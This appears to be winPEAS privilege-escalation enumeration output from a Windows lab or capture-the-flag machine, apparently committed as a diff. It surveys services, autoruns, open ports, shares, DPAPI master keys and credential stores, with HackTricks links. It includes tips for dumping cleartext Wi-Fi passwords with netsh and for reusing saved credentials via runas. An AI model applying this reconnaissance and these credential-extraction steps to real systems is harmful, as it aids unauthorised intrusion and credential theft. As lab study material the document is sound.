+    VMwareCAFCommAmqpListener(VMware CAF AMQP Communication Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe"] - Manual - Stopped
+    VMware Common Agent AMQP Communication Service
+   =================================================================================================
+
+    VMwareCAFManagementAgentHost(VMware CAF Management Agent Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"] - Auto - Running
+    VMware Common Agent Management Agent Service
+   =================================================================================================
+
+
+  [+] Modifiable Services(T1007)
+   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+    You cannot modify any service
+
+  [+] Looking if you can modify any service registry()
+   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
+    [-] Looks like you cannot change the registry of any service...
+
+  [+] Checking write permissions in PATH folders (DLL Hijacking)()
+   [?] Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
+    C:\Windows\system32
+    C:\Windows
+    C:\Windows\System32\Wbem
+    C:\Windows\System32\WindowsPowerShell\v1.0\
+
+
+  ====================================(Applications Information)====================================
+
+  [+] Current Active Window Application(T1010&T1518)
+    Windows PowerShell - winPEASany.exe  cmd 
+
+  [+] Installed Applications --Via Program Files/Uninstall registry--(T1083&T1012&T1010&T1518)
+   [?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
+    C:\Program Files\Common Files
+    C:\Program Files\desktop.ini
+    C:\Program Files\Embedded Lockdown Manager
+    C:\Program Files\Internet Explorer
+    C:\Program Files\Uninstall Information
+    C:\Program Files\VMware
+    C:\Program Files\Windows Mail
+    C:\Program Files\Windows NT
+    C:\Program Files\WindowsApps
+    C:\Program Files\WindowsPowerShell
+
+
+  [+] Autorun Applications(T1010)
+   [?] Check if you can modify other users AutoRuns binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
+    Folder: C:\Program Files\VMware\VMware Tools
+    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
+    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+   =================================================================================================
+
+System.Collections.Generic.KeyNotFoundException: The given key was not present in the dictionary.
+   at System.Collections.Generic.Dictionary`2.get_Item(TKey key)
+   at d4.ap()
+
+  [+] Scheduled Applications --Non Microsoft--(T1010)
+   [?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
+System.IO.FileNotFoundException: Could not load file or assembly Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233 or one of its dependencies. The system cannot find the file specified.
+File name: Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233
+   at dx.a()
+   at d4.ao()
+
+WRN: Assembly binding logging is turned OFF.
+To enable assembly bind failure logging, set the registry value [HKLM\Software\Microsoft\Fusion!EnableLog] (DWORD) to 1.
+Note: There is some performance penalty associated with assembly bind failure logging.
+To turn this feature off, remove the registry value [HKLM\Software\Microsoft\Fusion!EnableLog].
+
+
+
+  =========================================(Network Information)=========================================
+
+  [+] Network Shares(T1135)
+    ADMIN$ (Path: C:\Windows)
+    C$ (Path: C:\)
+    IPC$ (Path: )
+
+  [+] Host File(T1016)
+
+  [+] Network Ifaces and known hosts(T1016)
+   [?] The masks are only for the IPv4 addresses 
+  [X] Exception: The requested protocol has not been configured into the system, or no implementation for it exists
+    Ethernet0[00:50:56:B9:72:EE]: 10.10.10.8 / 255.255.255.0
+        Gateways: 10.10.10.2
+        DNSs: 10.10.10.2
+    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
+        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
+
+  [+] Current Listening Ports(T1049&T1049)
+   [?] Check for services restricted from the outside 
+    Proto     Local Address          Foreing Address        State
+    TCP       0.0.0.0:80                                    Listening
+    TCP       0.0.0.0:135                                   Listening
+    TCP       0.0.0.0:445                                   Listening
+    TCP       0.0.0.0:5985                                  Listening
+    TCP       0.0.0.0:47001                                 Listening
+    TCP       0.0.0.0:49152                                 Listening
+    TCP       0.0.0.0:49153                                 Listening
+    TCP       0.0.0.0:49154                                 Listening
+    TCP       0.0.0.0:49155                                 Listening
+    TCP       0.0.0.0:49156                                 Listening
+    TCP       0.0.0.0:49157                                 Listening
+    TCP       10.10.10.8:139                                Listening
+    TCP       [::]:135                                      Listening
+    TCP       [::]:445                                      Listening
+    TCP       [::]:5985                                     Listening
+    TCP       [::]:47001                                    Listening
+    TCP       [::]:49152                                    Listening
+    TCP       [::]:49153                                    Listening
+    TCP       [::]:49154                                    Listening
+    TCP       [::]:49155                                    Listening
+    TCP       [::]:49156                                    Listening
+    TCP       [::]:49157                                    Listening
+    UDP       0.0.0.0:123                                   Listening
+    UDP       0.0.0.0:5355                                  Listening
+    UDP       10.10.10.8:137                                Listening
+    UDP       10.10.10.8:138                                Listening
+    UDP       [::]:123                                      Listening
+
+  [+] Firewall Rules(T1016)
+   [?] Showing only DENY rules (too many ALLOW rules always) 
+    Current Profiles: PUBLIC
+    FirewallEnabled (Domain):    True
+    FirewallEnabled (Private):    True
+    FirewallEnabled (Public):    True
+    DENY rules:
+
+  [+] DNS cached --limit 70--(T1016)
+    Entry                                 Name                                  Data
+
+
+  =========================================(Windows Credentials)=========================================
+
+  [+] Checking Windows Vault()
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
+    Not Found
+
+  [+] Checking Credential manager()
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
+
+Currently stored credentials:
+
+* NONE *
+
+    [i] If any cred was found, you can use it with runas /savecred
+
+  [+] Saved RDP connections()
+    Not Found
+
+  [+] Recently run commands()
+    a: shell:startup\1
+    MRUList: a
+
+  [+] Checking for DPAPI Master Keys()
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+    MasterKey: C:\Users\kostas\AppData\Roaming\Microsoft\Protect\S-1-5-21-605891470-2991919448-81205106-1001\66a2714d-f5db-40c8-ac6d-44ec2635e69d
+    Accessed: 18/3/2017 1:57:39 ��
+    Modified: 18/3/2017 1:57:39 ��
+   =================================================================================================
+
+    MasterKey: C:\Users\kostas\AppData\Roaming\Microsoft\Protect\S-1-5-21-605891470-2991919448-81205106-1001\d391fc04-6aaf-4a6e-a681-b5419923cd5d
+    Accessed: 1/8/2020 3:27:41 ��
+    Modified: 1/8/2020 3:27:41 ��
+   =================================================================================================
+
+
+  [+] Checking for Credential Files()
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+    Not Found
+
+  [+] Checking for RDCMan Settings Files()
+   [?] Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
+    Not Found
+
+  [+] Looking for kerberos tickets()
+   [?]  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
+    Not Found
+
+  [+] Looking saved Wifis()
+    The following command was not found: wlan show profile.
+
+    [i] If you want to get the clear-text password use netsh wlan show profile <SSID> key=clear
+
+  [+] Looking AppCmd.exe()
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
+    Not Found
+
+  [+] Looking SSClient.exe()
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
+    Not Found
+
+  [+] Checking AlwaysInstallElevated(T1012)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated isnt available
+
+  [+] Checking WSUS(T1012)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
+    Not Found
+
+
+  ========================================(Browsers Information)========================================
+
+  [+] Looking for Firefox DBs(T1503)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Looking for GET credentials in Firefox history(T1503)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Looking for Chrome DBs(T1503)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Looking for GET credentials in Chrome history(T1503)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Chrome bookmarks(T1217)
+    Not Found
+
+  [+] Current IE tabs(T1503)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Looking for GET credentials in IE history(T1503)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+
+  [+] IE favorites(T1217)
+    http://go.microsoft.com/fwlink/p/?LinkId=255142
+
+
+  ==============================(Interesting files and registry)==============================
+
+  [+] Putty Sessions()
+    Not Found
+
+  [+] Putty SSH Host keys()
+    Not Found
+
+  [+] SSH keys in registry()
+   [?] If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry
+    Not Found
+
+  [+] Cloud Credentials(T1538&T1083&T1081)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+    Not Found
+
+  [+] Unnattend Files()
+
+  [+] Looking for common SAM & SYSTEM backups()
+
+  [+] Looking for McAfee Sitelist.xml Files()
+
+  [+] Cached GPP Passwords()
+  [X] Exception: Could not find a part of the path C:\ProgramData\Microsoft\Group Policy\History.
+
+  [+] Looking for possible regs with creds(T1012&T1214)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry
+    Not Found
+    Not Found
+    Not Found
+    Not Found
+
+  [+] Looking for possible password files in users homes(T1083&T1081)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+
+  [+] Looking inside the Recycle Bin for creds files(T1083&T1081&T1145)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+    Not Found
+
+  [+] Searching known files that can contain creds in home(T1083&T1081)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+
+  [+] Looking for documents --limit 100--(T1083)
+    Not Found
+
+  [+] Recent files --limit 70--(T1083&T1081)
+    Not Found
